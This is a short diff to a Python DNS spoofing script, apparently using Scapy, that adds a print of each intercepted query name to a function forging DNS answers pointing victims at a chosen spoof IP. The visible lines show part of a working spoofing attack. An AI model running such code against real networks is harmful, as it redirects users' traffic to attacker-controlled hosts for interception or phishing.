@@ -22,6 +22,7 @@ def process_args() -> Tuple[str, str, str]:
 
 
 def spoof_packets(packet, spoof_ip: str) -> None:
+    print(f"Intercepted packet: {packet[DNS].qd.qname}")
     ip = IP(dst=packet[IP].src, src=packet[IP].dst)
     udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
     rr = DNSRR(rrname=packet[DNS].qd.qname, ttl=3800, rdata=spoof_ip)
